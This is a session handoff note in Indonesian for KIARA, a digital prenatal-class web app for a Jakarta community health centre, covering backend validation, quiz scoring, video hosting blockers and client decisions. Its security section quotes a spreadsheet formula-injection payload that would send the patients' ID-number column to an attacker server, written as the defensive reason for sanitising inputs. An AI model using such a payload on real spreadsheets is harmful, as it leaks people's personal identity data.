# Catatan Sesi — KIARA

Rekaman keadaan proyek untuk dilanjutkan di sesi berikutnya.
Terakhir diperbarui: **5 Agustus 2026**, commit `9635e73`.

---

## 1. Identitas proyek

| | |
|---|---|
| Nama | KIARA — Kelas Ibu Hamil Digital |
| Klien | Puskesmas Kecamatan Cakung |
| Alur inti | Pasien scan QR di ruang tunggu → isi NIK → aplikasi kenali riwayat → tentukan sesi ke berapa → pre-test → materi → post-test → simpan ke Google Sheet |
| Folder | `dashboard/kiara-puskes-cakung/` |
| Repo | https://github.com/iamsleepyhead00/kiara-puskes-cakung (publik) |
| Spreadsheet | "Rekap Hasil Kiara 2026", tab `KIARA` |
| Endpoint | lihat `SHEETS_ENDPOINT` di `config.js` |
| Server preview | `python -m http.server 8000` di folder proyek |

**Dokumen acuan:** `konsep KIARA.docx` (2 Agu 2026). Menggantikan
`FORMAT KIARA.docx` (31 Jul) — yang lama jangan dipakai lagi. Dokumen sumber
pernah diedit klien saat sedang dianalisis, jadi bisa berubah lagi.

---

## 2. Status sekarang

**Yang sudah jalan dan terverifikasi:**

- Backend Apps Script **versi 5** sudah ter-deploy dan aktif
- Validasi ketat live — diuji: skor 90 ditolak `"Post-Test harus kelipatan 20"`, skor 80 diterima
- Simpan dan lookup ke sheet berhasil (13 kolom, satu baris per kunjungan)
- Clamp KKM terbukti: kirim `kkm=0` tetap menghasilkan `BELUM`, bukan `LULUS`
- Anti-injeksi formula terbukti: `=CONCATENATE(E2:E50)` tersimpan sebagai teks, bukan formula
- `OFFLINE_MODE: false` — aplikasi tersambung ke sheet sungguhan
- Favicon ikon bayi di tab browser

**Yang belum bisa dipakai pasien:** materi kosong. Lihat bagian Blocker.

---

## 3. Keputusan yang sudah dipatok klien

Jangan diubah tanpa instruksi baru.

| Hal | Keputusan |
|---|---|
| Sesi aktif | **hanya 1–4**. Sesi 5–10 disimpan di `sesiDitahan` (`content.js`) |
| Soal per sesi | **5 soal** Benar/Salah, pre-test dan post-test |
| KKM | **80** = lulus 4 dari 5 benar |
| Materi PDF | **tidak dipakai** (slide + komik). Definisi disimpan di `materiDitahan`, file PDF sudah dihapus dari disk — bisa dibuat ulang dari zip di Downloads |
| Sertifikat kelulusan | **DI-HOLD**. Jangan dibangun. Layar S13 dan `ENABLE_SERTIFIKAT` sudah dicabut |
| Struktur sheet | **13 kolom datar**, ditetapkan puskesmas. Jangan diubah |
| Tombol kirim WA | **tidak muncul** kalau belum capai KKM. Sekarang hanya ada di S8 dan S10 |
| Tombol "Materi Berikutnya" | **disembunyikan**, bukan diredam, sampai materi tuntas |
| Dropdown | placeholder wajib jadi nilai awal, tapi **tidak boleh muncul sebagai baris** di daftar (pakai atribut `hidden`) |
| Nomor WA tujuan | `085889945829` (bukan yang lama `085945371933`) |
| Keamanan endpoint | risiko diterima selama masa uji, repo tetap publik |

---

## 4. Yang dikerjakan di sesi ini

### Validasi ketat di Apps Script — commit `f021527`

Endpoint terbuka untuk siapa pun yang punya URL, jadi tidak boleh mempercayai
apa pun dari klien. Ditambahkan di `gas/Code.gs`:

| Fungsi | Peran |
|---|---|
| `validasiSimpan()` | periksa semua field: NIK 16 digit, nama 3–80 tanpa HTML/URL, WA `^0\d{8,14}$`, alamat 5–200, kelurahan & puskesmas harus dari daftar resmi, kunjungan 1–10, skor 0–100 kelipatan `POIN_PER_SOAL` |
| `amanTeks()` | netralkan injeksi formula Sheets — nilai berawalan `=` `+` `-` `@` diberi prefiks apostrof |
| `tanpaApostrof()` | lepas prefiks itu saat data dibaca kembali ke aplikasi |
| `dalamRentang()` | clamp `kkm` dan `totalSesi`, supaya klien tidak bisa kirim `kkm=0` agar semua LULUS |
| `lolosThrottle()` | batas 40 simpan / 10 menit lewat `ScriptProperties`, dipanggil di dalam lock |
| `ujiValidasi()` | 16 payload buruk dilempar ke validator, tidak menulis apa pun ke sheet |

Urutan di `handleSave`: validasi (di luar lock, murni hitungan) → lock →
`bedaHeader` → throttle → tulis.

Injeksi formula itu risiko nyata justru karena bidan membuka spreadsheet.
Payload `=IMPORTXML("https://server-penyerang/?d="&CONCATENATE(E2:E50),"//a")`
di kolom Nama bisa mengirim seluruh kolom NIK keluar begitu file dibuka.

Di `index.html`, input Nama diberi `maxlength="80"` dan Alamat `maxlength="200"`
supaya form tidak bisa menghasilkan nilai yang ditolak server.

### 5 soal per sesi, KKM 80 — commit `1c4463c`

Klien konfirmasi tiap sesi hanya 5 soal dan lulus 4 dari 5. Buku fasilitator
berisi 10 soal per pertemuan, jadi tiap set dibelah lewat `bagianSoal`:

| Sesi | Set buku | Bagian | Soal buku |
|---|---|---|---|
| 1 · Kehamilan Sehat | Pertemuan I | 1 | 1–5 |
| 2 · Pemeriksaan & Gizi | Pertemuan I | 2 | 6–10 |
| 3 · Perawatan Diri | Pertemuan III | 1 | 1–5 |
| 4 · Tanda Bahaya | Pertemuan III | 2 | 6–10 |

Sebelumnya sesi 1 & 2 memakai set yang sama persis sehingga soalnya terulang.
Sekarang tidak — sudah diuji, sesi 1–4 dapat 5 soal masing-masing tanpa
tumpang tindih, di wilayah TTD maupun MMS.

Skala skor jadi kelipatan 20: `0, 20, 40, 60, 80, 100`. Yang berubah:

- `config.js` → `SOAL_PER_SESI: 5` (baru), `KKM: 75 → 80`
- `app.js` → `soalSesi()` memotong 5 soal, `namaSet()` menyebut rentang soalnya
- `gas/Code.gs` → `POIN_PER_SOAL: 10 → 20`, `KKM_DEFAULT: 75 → 80`
- `hitungSkor()` **tidak disentuh** — rumusnya `benar / soal.length × 100`, otomatis ikut

### Favicon — commit `9635e73`

`icons/favicon.svg`, ikon Lucide `baby` yang sama dengan splash screen. Digambar
sebagai kotak berisi `#b03a5b` dengan bayi krem di atasnya, karena garis tipis
Lucide nyaris tidak terlihat di ukuran 16px dan warnanya ambigu di tab gelap
maupun terang. Path diverifikasi 4 dari 4 cocok dengan rilis Lucide resmi.

Catatan: `apple-touch-icon` diarahkan ke SVG yang sama, tapi Safari tidak
mendukung SVG untuk ikon home-screen. Kalau nanti perlu, butuh PNG 180×180
plus `manifest.json` agar jadi PWA.

---

## 5. Blocker — aplikasi belum bisa dipakai pasien

### 5.1 Video belum di hosting

11 file, **1.122 MB**, dikecualikan dari git lewat `.gitignore`. Begitu GitHub
Pages nyala, semua materi blank — pasien mentok di layar materi.

Dua file ditolak GitHub secara keras (batas 100 MB/file):
`Video-Maternal-1-Kelas-Ibu-Hamil.mp4` (366 MB) dan
`Video-Maternal-2-Pemeriksaan-ANC.mp4` (309 MB).

Yang diunduh satu ibu untuk 4 sesi (wilayah TTD): **±896 MB**. Kuota GitHub
Pages 100 GB/bulan berarti hanya cukup untuk ±111 ibu, itu pun tanpa nonton ulang.

**Rencana yang disepakati arahnya:** kompres dulu → aplikasi tetap di GitHub
Pages (atau Cloudflare Pages yang bandwidth-nya tanpa batas) → video di YouTube
unlisted.

Kompresi harus didahulukan karena mengubah matematika semua opsi. Presedennya
sudah ada di EduCatin: `dashboard/questionnaire/compress_video.py`, bitrate
500 kbps, video 366 detik jadi di bawah 25 MB.

Durasi video KIARA **belum terukur** — `ffprobe` tidak ada di mesin. Perlu
ffmpeg atau moviepy lewat `.venv` untuk dapat angka kompresi yang nyata.

Alasan memilih YouTube di atas Cloudflare R2 walau R2 lebih bersih (egress $0):
**kualitas adaptif**. Pasien menonton dari HP sendiri di ruang tunggu dengan
sinyal tak terduga. mp4 statis dari R2 tidak bisa menurunkan resolusi otomatis
— sinyal lemah berarti buffering terus.

Anti-skip sudah siap untuk kedua jenis (`controls:0` + `disablekb:1` untuk
YouTube, `controls=false` untuk mp4). Setelah upload, ubah `content.js` ke
`tipe:'youtube'` dan isi ID videonya.

**Perlu izin puskesmas** sebelum menaruh video mereka di YouTube, walau
unlisted — link-nya akan terlihat di source aplikasi.

### 5.2 Sesi 4 tidak punya materi sama sekali

Klien bilang sesi 1–4 dipakai **karena materinya sudah ada**. Kenyataannya:

| Sesi | TTD | MMS |
|---|---|---|
| 1 | 2 video | 2 video |
| 2 | 3 video | 3 video |
| 3 | 1 video | **kosong** |
| 4 | **kosong** | **kosong** |

Ada yang tidak nyambung di sini. Sekarang aplikasi menampilkan "Materi sesi ini
disampaikan langsung oleh bidan" dan tombolnya melompat ke post-test — tapi itu
**tebakan, bukan keputusan puskesmas**.

### 5.3 GitHub Pages belum diaktifkan

Settings → Pages → main / root.

---

## 6. Menunggu jawaban puskesmas

| # | Hal | Kondisi sekarang |
|---|---|---|
| 1 | Wilayah **TTD atau MMS** | ditebak `TTD` di `config.js`. Menentukan video gizi, komik anemia, dan 3 soal. Salah pilih = ibu dapat materi anemia yang bukan programnya |
| 2 | Materi sesi 4 (dan sesi 3 MMS) | kosong, lihat 5.2 |
| 3 | 5 soal mana dari 10 di buku | dibelah 1–5 / 6–10 menurut urutan buku |
| 4 | Pemetaan sesi → set soal | disusun sendiri dari kecocokan topik |
| 5 | Dua kunci jawaban yang terlihat keliru | ditulis apa adanya, ditandai `perluKonfirmasi` |
| 6 | Template pesan WhatsApp | dikarang sendiri |
| 7 | Izin video ke YouTube unlisted | belum ditanyakan |

Detail nomor 5:

- **Pertemuan II no. 3** — "Kepanjangan dari IMD adalah Inisiasi Menyusu Dini",
  buku menulis kunci Salah padahal itu memang benar. Kemungkinan salah cetak.
  Ada di bagian 1 set 2 → sesi 5, masih ditahan.
- **Pertemuan III no. 3 varian MMS** — kuncinya berlawanan arah dengan varian
  TTD-nya. Ada di bagian 1 set 3 → **sesi 3 yang aktif**. Kalau wilayahnya
  ternyata MMS, ini harus dibereskan dulu.

Konten kesehatan tidak pernah dikarang atau dikoreksi sendiri.

---

## 7. Yang perlu dilakukan user

| # | Tindakan | Catatan |
|---|---|---|
| 1 | Jalankan `hapusUji()` di Apps Script | Ada 1 baris uji NIK `9999999999999999` sisa verifikasi terakhir |
| 2 | Kompres video, lalu upload ke YouTube unlisted | blocker utama |
| 3 | Aktifkan GitHub Pages | Settings → Pages → main / root |
| 4 | Ganti deployment Apps Script atau jadikan repo private | **sebelum** dipakai pasien nyata |
| 5 | Tulis batas scope + termin bayar ke klien | lihat bagian 9 |
| 6 | Pindahkan repo keluar folder kantor | opsional, lihat bagian 8 |

---

## 8. Keamanan dan lingkungan

**Endpoint terbuka.** URL Web App memberi akses tulis ke sheet bagi siapa pun
yang memilikinya. Aplikasi statis berarti URL selalu terlihat di DevTools, dan
repo publik berarti bisa ditemukan pemindai otomatis GitHub.

Selama masa uji risiko ini diterima user. Peredam yang sudah dipasang (validasi,
clamp, throttle, anti-injeksi) hanya mencegah data ngawur dan banjir — **bukan
menutup akses**. Sebelum pasien nyata, lakukan salah satu:

- Apps Script → Deploy → Manage deployments → Edit → New version (URL berubah,
  lalu perbarui `SHEETS_ENDPOINT` di `config.js`)
- atau jadikan repo private

**NIK disimpan mentah** sesuai struktur yang diminta puskesmas. Spreadsheet
jangan pernah dibagikan dengan opsi "anyone with the link" — share ke akun bidan
tertentu saja. Di pesan WhatsApp NIK ditampilkan tersamar (`3175••••••••1234`).

**Repo masih di dalam folder kantor.** `c:\KIRO AKUH\sinta\` remote-nya GitLab
kantor (`mitrakeluarga/sinta`), dan KIARA jadi repo terpisah di dalamnya.
Identitas git lokal KIARA sudah di-set ke akun pribadi
(`iamsleepyhead00 <iamsleepyhead00@users.noreply.github.com>`) — **sengaja tidak
memakai identitas kantor** yang ada di repo induk. Config global mesin tidak
disentuh. `media/` (1.122 MB) sudah diverifikasi tidak ikut ter-push.

---

## 9. Catatan komersial

Penawaran awal 4jt → didiskon 3jt → klien menawar **1jt** (setara Rp 95rb/hari
untuk 10,5 hari kerja). User mengambil proyeknya karena butuh cash.

**Belum dilakukan:** menulis batas scope dan termin bayar ke klien di WhatsApp.
Ini makin relevan karena scope sudah bertambah banyak sejak kesepakatan 1jt:
anti-skip video, validasi ketat backend, migrasi struktur 13 kolom, perombakan
tampilan, ganti skema soal jadi 5/KKM 80, favicon.

Semua itu di luar penawaran awal. Tanpa batas tertulis, permintaan berikutnya
akan dianggap "masih termasuk". Minimal tulis: apa yang masuk, apa yang di luar
(sertifikat, upload video, revisi materi), dan DP 50%.

Klien tidak paham IT, jadi saran sebelumnya: tanyakan asal angka 1jt — kemungkinan
itu plafon mekanisme pembayaran, bukan plafon nilai proyek.

---

## 10. Konvensi kerja

- Balas dalam **Bahasa Indonesia informal**, sapaan "lu/gw"
- Jangan bertele-tele, tapi tetap teliti
- **Jangan menambahkan file uji permanen.** Buat file `_*.js` atau `_*.ps1`
  sementara, jalankan, lalu hapus
- Output PowerShell sering terpotong — tulis hasil ke file lalu `Get-Content`
- Uji endpoint Apps Script pakai `curl.exe -sL`, **bukan** `Invoke-RestMethod`
  (balas 404 palsu untuk request berparameter)
- Google kadang membalas halaman HTML "Halaman Tidak Ditemukan" alih-alih JSON.
  Itu gangguan sesaat, ulangi requestnya
- Naikkan `?v=` di `index.html` setiap JS/CSS berubah. Sekarang:
  `style.css?v=9`, `config.js?v=6`, `content.js?v=6`, `visit-tracker.js?v=4`,
  `app.js?v=15`
- **Jangan mengarang konten kesehatan.** Kunci jawaban yang terlihat keliru
  ditulis apa adanya lalu ditandai `perluKonfirmasi`
- Jangan pakai identitas git kantor untuk repo pribadi user
- Jangan mengubah struktur 13 kolom sheet
- PowerShell membalas exit code 1 saat `git push` walau berhasil — itu kuirk
  penanganan stderr, cek `main ->` di outputnya

---

## 11. Peta file

| File | Isi |
|---|---|
| `index.html` | 13 layar (S1–S12), markup semua screen |
| `style.css` | palet plum-wine `#b03a5b`, 9 token ukuran teks (`--t-micro` … `--t-logo`) |
| `config.js` | satu-satunya file yang perlu diubah saat deploy |
| `content.js` | peta sesi, `sesiDitahan`, `materiDitahan`, bank soal 4×10, template WA |
| `visit-tracker.js` | lookup/save, mode offline, validasi NIK & HP |
| `app.js` | seluruh logika layar, `soalSesi()`, `hitungSkor()`, anti-skip |
| `gas/Code.gs` | backend Apps Script, validasi, uji `ujiTulis`/`ujiBaca`/`ujiValidasi`/`hapusUji` |
| `icons/favicon.svg` | ikon bayi untuk tab |
| `STRUKTUR-GOOGLE-SHEET.md` | 13 kolom, aturan validasi, 9 rumus rekap untuk bidan |
| `BATAS-MEDIA-GITHUB.md` | analisis batas media dan alasan GitHub tidak layak untuk video |
| `README.md` | ikhtisar, alur layar, tabel pertanyaan terbuka |
| `media/` | 11 video, 1.122 MB, **tidak ikut git** |
